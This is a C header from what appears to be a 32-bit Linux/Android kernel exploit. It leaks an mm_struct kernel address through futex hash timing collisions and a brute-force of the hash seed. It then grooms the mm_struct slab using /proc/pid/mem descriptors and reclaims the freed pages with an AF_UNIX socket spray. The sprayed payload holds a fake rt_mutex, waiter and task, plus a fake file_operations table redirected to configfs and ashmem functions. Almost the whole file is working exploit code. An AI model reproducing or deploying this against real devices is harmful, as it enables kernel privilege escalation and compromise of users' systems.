#ifndef GL_RECLAIM_H
#define GL_RECLAIM_H

#define KS_PAGE 4096u
#define KS_HASH_MAX 4096u
#define KS_PILE 2048u
#define KS_TEST_PAGES 16384u
#define KS_REPEATS 20u
#define MM_OBJS 18u
#define MM_OBJ_SIZE 0x1c0u
#define MM_SLAB_SIZE (KS_PAGE * 2u)
#define RECLAIM_DATA MM_SLAB_SIZE
#define MM_PARTIALS 8u
#define RECLAIM_PAGES 4096u

static uint32_t g_fake_lock, g_fake_fops;

static void gl_raise_nofile(unsigned want) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl))
        return;
    rlim_t need = (rlim_t)want * 2u + 2048u;
    if (rl.rlim_cur >= need)
        return;
    rlim_t target = rl.rlim_max == RLIM_INFINITY ? need : (need < rl.rlim_max ? need : rl.rlim_max);
    rlim_t before = rl.rlim_cur;
    rl.rlim_cur = target;
    if (setrlimit(RLIMIT_NOFILE, &rl))
        return;
    dprintf(2, "[heap] raised RLIMIT_NOFILE %lu->%lu\n", (unsigned long)before,
            (unsigned long)target);
}
static int (*g_reclaim_svs)[2];
static uint8_t *g_reclaim_payload;
static unsigned g_reclaim_made;

struct ks_shared {
    volatile unsigned started, ready;
    uintptr_t target;
    uintptr_t hits[8];
    uint64_t hit_ns[8];
};

static uint8_t ks_pile_page[KS_PAGE] __attribute__((aligned(KS_PAGE)));
static struct ks_shared *ks_state;
static uint8_t *ks_arena;

static int ks_futex(uint32_t *p, int op, uint32_t val) {
    return (int)syscall(__NR_futex, p, op, val, 0, 0, 0);
}

static uint64_t ks_now(void) {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (uint64_t)t.tv_sec * 1000000000ull + (uint64_t)t.tv_nsec;
}

static int ks_cmp64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static uint64_t ks_measure(uint32_t *p) {
    uint64_t v[KS_REPEATS], sum = 0;
    for (unsigned i = 0; i < KS_REPEATS; i++) {
        uint64_t a = ks_now();
        ks_futex(p, FUTEX_WAKE_PRIVATE, 0);
        v[i] = ks_now() - a;
    }
    qsort(v, KS_REPEATS, sizeof(v[0]), ks_cmp64);
    for (unsigned i = 0; i < 4; i++)
        sum += v[i];
    return sum / 4;
}

static void *ks_waiter(void *unused) {
    (void)unused;
    __atomic_add_fetch(&ks_state->ready, 1, __ATOMIC_RELEASE);
    ks_futex((uint32_t *)&ks_pile_page[128], FUTEX_WAIT_PRIVATE, 0);
    return 0;
}

struct ks_hit {
    uintptr_t addr;
    uint64_t ns;
};
static int ks_hit_desc(const void *a, const void *b) {
    const struct ks_hit *x = a, *y = b;
    return (x->ns < y->ns) - (x->ns > y->ns);
}

static void ks_find_collisions_child(void) {
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 32768);
    pthread_t *tids = calloc(KS_PILE, sizeof(*tids));
    ks_state->started = 1;
    unsigned made = 0;
    for (; made < KS_PILE; made++) {
        if (pthread_create(&tids[made], &attr, ks_waiter, 0))
            break;
    }
    pthread_attr_destroy(&attr);
    while (__atomic_load_n(&ks_state->ready, __ATOMIC_ACQUIRE) != made)
        sched_yield();
    usleep(150000);
    struct ks_hit top[16];
    memset(top, 0, sizeof(top));
    for (unsigned i = 1; i < KS_TEST_PAGES; i++) {
        size_t off = (size_t)i * KS_PAGE + ((size_t)i * 8u & (KS_PAGE - 1));
        struct ks_hit h = {(uintptr_t)(ks_arena + off), ks_measure((uint32_t *)(ks_arena + off))};
        if (h.ns > top[15].ns) {
            top[15] = h;
            qsort(top, 16, sizeof(top[0]), ks_hit_desc);
        }
    }
    ks_state->target = (uintptr_t)&ks_pile_page[128];
    for (unsigned i = 0; i < 8; i++) {
        ks_state->hits[i] = top[i].addr;
        ks_state->hit_ns[i] = top[i].ns;
    }
    _exit(0);
}

static inline uint32_t ks_rol(uint32_t x, unsigned s) {
    return (x << (s & 31)) | (x >> ((32 - s) & 31));
}

static uint32_t g_hash_len = 2, g_hash_seed = 0xdeadbeefu, g_hash_mask = 0x3ffu;

static inline uint32_t ks_hash(uintptr_t addr, uint32_t mm) {
    uint32_t page = (uint32_t)addr & ~(KS_PAGE - 1);
    uint32_t off = (uint32_t)addr & (KS_PAGE - 1);
    uint32_t base = g_hash_seed + (g_hash_len << 2) + off;
    uint32_t a = base, b = base, c = base;
    if (g_hash_len >= 3) {

        a += mm;
        c += page;
    } else {

        a += page;
        b += mm;
    }
    c ^= b;
    c -= ks_rol(b, 14);
    a ^= c;
    a -= ks_rol(c, 11);
    b ^= a;
    b -= ks_rol(a, 25);
    c ^= b;
    c -= ks_rol(b, 16);
    a ^= c;
    a -= ks_rol(c, 4);
    b ^= a;
    b -= ks_rol(a, 14);
    c ^= b;
    c -= ks_rol(b, 24);
    return c & g_hash_mask;
}

struct ks_brute {
    uint32_t start, end;
    volatile uint32_t *found;
};
static void *ks_brute_thread(void *opaque) {
    struct ks_brute *x = opaque;
    for (uint32_t mm = x->start; mm < x->end && !*x->found; mm += 4) {
        uint32_t h = ks_hash(ks_state->target, mm);
        if (ks_hash(ks_state->hits[0], mm) != h)
            continue;
        if (ks_hash(ks_state->hits[1], mm) != h)
            continue;
        if (ks_hash(ks_state->hits[2], mm) != h)
            continue;
        if (ks_hash(ks_state->hits[3], mm) != h)
            continue;
        __sync_bool_compare_and_swap(x->found, 0, mm);
        break;
    }
    return 0;
}

static uint32_t ks_solve_mm(void) {
    volatile uint32_t found = 0;
    pthread_t tids[4];
    struct ks_brute args[4];
    for (unsigned i = 0; i < 4; i++) {
        args[i].start = 0xc0000000u + i * 0x0c000000u;
        args[i].end = args[i].start + 0x0c000000u;
        args[i].found = &found;
        pthread_create(&tids[i], 0, ks_brute_thread, &args[i]);
    }
    for (unsigned i = 0; i < 4; i++)
        pthread_join(tids[i], 0);
    return found;
}

static int open_child_mem(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    return open(path, O_RDONLY | O_CLOEXEC);
}

static int alloc_held_mm(void) {
    pid_t p = fork();
    if (p == 0)
        for (;;)
            pause();
    if (p < 0)
        return -1;
    int fd = open_child_mem(p);
    kill(p, SIGKILL);
    waitpid(p, 0, 0);
    if (fd < 0)
        return -1;

    int held = fcntl(fd, F_DUPFD_CLOEXEC, 512);
    close(fd);
    return held;
}

static void fill_reclaim_payload(uint8_t *p, uint32_t page_base) {
    memset(p, 0, MM_SLAB_SIZE);
    uint32_t lock = page_base + 0x100;
    uint32_t waiter = page_base + 0x140;
    uint32_t task = page_base + 0x400;

    *(uint32_t *)(p + 0x100 + 0x04) = waiter;
    *(uint32_t *)(p + 0x100 + 0x08) = waiter;
    *(uint32_t *)(p + 0x100 + 0x0c) = task | 1u;

    *(uint32_t *)(p + 0x140 + 0x00) = 1;
    *(uint32_t *)(p + 0x140 + 0x18) = g_profile.pi_task;
    *(uint32_t *)(p + 0x140 + 0x1c) = lock;
    *(uint32_t *)(p + 0x140 + 0x20) = 0;

    *(uint32_t *)(p + 0x400 + 0x08) = 0x100;
    *(uint32_t *)(p + 0x400 + g_profile.task_prio_off) = 120;
    *(uint32_t *)(p + 0x400 + g_profile.task_static_prio_off) = 120;
    *(uint32_t *)(p + 0x400 + g_profile.task_normal_prio_off) = 120;
    *(uint32_t *)(p + 0x400 + 0x594) = 0;
    *(uint32_t *)(p + 0x400 + 0x598) = 0;
    *(uint32_t *)(p + 0x400 + 0x59c) = 0;

    *(uint32_t *)(p + 0x200 + g_profile.fops_read_off) = g_profile.configfs_read_file;
    *(uint32_t *)(p + 0x200 + g_profile.fops_read_off + 4) = g_profile.configfs_write_file;
    *(uint32_t *)(p + 0x200 + g_profile.fops_ioctl_off) = g_profile.ashmem_ioctl;
    *(uint32_t *)(p + 0x200 + g_profile.fops_mmap_off) = g_profile.ashmem_mmap;
    *(uint32_t *)(p + 0x200 + g_profile.fops_open_off) = g_profile.ashmem_open;
    *(uint32_t *)(p + 0x200 + g_profile.fops_release_off) = g_profile.ashmem_release;
}

static int setup_socket_reclaim(uint32_t page_base) {
    g_reclaim_payload = aligned_alloc(MM_SLAB_SIZE, MM_SLAB_SIZE);
    g_reclaim_svs = calloc(RECLAIM_PAGES, sizeof(*g_reclaim_svs));
    if (!g_reclaim_payload || !g_reclaim_svs)
        return 0;
    fill_reclaim_payload(g_reclaim_payload, page_base);

    for (g_reclaim_made = 0; g_reclaim_made < RECLAIM_PAGES; g_reclaim_made++) {
        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, g_reclaim_svs[g_reclaim_made]))
            break;
        int snd = 1 << 20;
        setsockopt(g_reclaim_svs[g_reclaim_made][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    }
    if (!g_reclaim_made)
        return 0;
    g_fake_lock = page_base + 0x100;
    g_fake_fops = page_base + 0x200;
    dprintf(2,
            "[heap] prepared %u AF_UNIX stream sockets; "
            "fake_lock=%08x fake_fops=%08x\n",
            g_reclaim_made, g_fake_lock, g_fake_fops);
    return 1;
}

static int launch_socket_reclaim(void) {
    unsigned sent = 0;
    for (; sent < g_reclaim_made; sent++) {
        if (send(g_reclaim_svs[sent][0], g_reclaim_payload, RECLAIM_DATA, 0) != RECLAIM_DATA)
            break;
    }
    dprintf(2, "[heap] sprayed %u/%u full-page AF_UNIX payloads\n", sent, g_reclaim_made);
    return sent != 0;
}

static int prepare_reclaimed_page(void) {
    gl_raise_nofile(RECLAIM_PAGES);
    const unsigned prep_n = 32 * MM_OBJS;
    const unsigned spray_n = (1 + MM_PARTIALS) * MM_OBJS;
    int *prep = calloc(prep_n, sizeof(*prep));
    int *spray = calloc(spray_n, sizeof(*spray));
    int pre[MM_OBJS - 1], post[MM_OBJS];
    if (!prep || !spray)
        return 0;
    pin_core(g_profile.consumer_core);
    dprintf(2, "[heap] shaping mm_struct cache (%u+%u objects)\n", prep_n, spray_n);
    for (unsigned i = 0; i < prep_n; i++)
        if ((prep[i] = alloc_held_mm()) < 0)
            return 0;
    for (unsigned i = 0; i < spray_n; i++)
        if ((spray[i] = alloc_held_mm()) < 0)
            return 0;

    size_t arena_sz = (size_t)KS_TEST_PAGES * KS_PAGE;
    ks_state = mmap(0, KS_PAGE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    ks_arena = mmap(0, arena_sz, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (ks_state == MAP_FAILED || ks_arena == MAP_FAILED)
        return 0;
    memset(ks_state, 0, KS_PAGE);

    for (unsigned i = 0; i < MM_OBJS - 1; i++)
        if ((pre[i] = alloc_held_mm()) < 0)
            return 0;
    pid_t leak = fork();
    if (leak == 0)
        ks_find_collisions_child();
    if (leak < 0)
        return 0;
    while (!ks_state->started)
        sched_yield();
    int leak_raw_fd = open_child_mem(leak);
    if (leak_raw_fd < 0)
        return 0;
    int leak_fd = fcntl(leak_raw_fd, F_DUPFD_CLOEXEC, 512);
    close(leak_raw_fd);
    if (leak_fd < 0)
        return 0;
    for (unsigned i = 0; i < MM_OBJS; i++)
        if ((post[i] = alloc_held_mm()) < 0)
            return 0;
    waitpid(leak, 0, 0);
    dprintf(2, "[leak] collision timings %llu %llu %llu %llu ns\n",
            (unsigned long long)ks_state->hit_ns[0], (unsigned long long)ks_state->hit_ns[1],
            (unsigned long long)ks_state->hit_ns[2], (unsigned long long)ks_state->hit_ns[3]);
    uint32_t leaked_mm = ks_solve_mm();
    if (!leaked_mm) {
        dprintf(2, "[-] mm solve failed\n");
        return 0;
    }
    uint32_t page_base = leaked_mm & ~(MM_SLAB_SIZE - 1);
    unsigned target_index = (leaked_mm - page_base) / MM_OBJ_SIZE;
    dprintf(2, "[leak] child mm=%08x slab_page=%08x slot=%x index=%u\n", leaked_mm, page_base,
            leaked_mm & (KS_PAGE - 1), target_index);
    if (target_index >= MM_OBJS || page_base + target_index * MM_OBJ_SIZE != leaked_mm) {
        dprintf(2, "[-] mm at offset %#x is not on the %#x object grid\n",
                leaked_mm - page_base, MM_OBJ_SIZE);
        return 0;
    }
    pin_core(g_profile.consumer_core);
    if (!setup_socket_reclaim(page_base))
        return 0;

    for (unsigned i = 0; i < MM_OBJS - 1; i++)
        close(pre[i]);
    close(leak_fd);
    for (unsigned i = 0; i < MM_OBJS; i++)
        close(post[i]);
    for (unsigned i = 0; i < spray_n; i++)
        close(spray[i]);
    for (unsigned i = 0; i < prep_n; i++)
        close(prep[i]);
    for (unsigned i = 0; i < 16; i++)
        sched_yield();

    dprintf(2, "[heap] all mm slabs freed; launching AF_UNIX reclaim\n");
    if (!launch_socket_reclaim())
        return 0;

    (void)prep;
    (void)spray;
    (void)post;
    return 1;
}

static int find_reclaim_value(unsigned off, uint32_t value) {
    if (!g_reclaim_svs || off > MM_SLAB_SIZE - 4)
        return -1;
    uint8_t *peek = malloc(MM_SLAB_SIZE);
    if (!peek)
        return -1;
    for (unsigned i = 0; i < g_reclaim_made; i++) {
        ssize_t n = recv(g_reclaim_svs[i][1], peek, RECLAIM_DATA, MSG_PEEK | MSG_DONTWAIT);
        if (n == RECLAIM_DATA && *(uint32_t *)(peek + off) == value) {
            free(peek);
            return (int)i;
        }
    }
    free(peek);
    return -1;
}

static int find_fake_fops_word(unsigned off, uint32_t value) {
    return find_reclaim_value(0x200 + off, value);
}

#endif
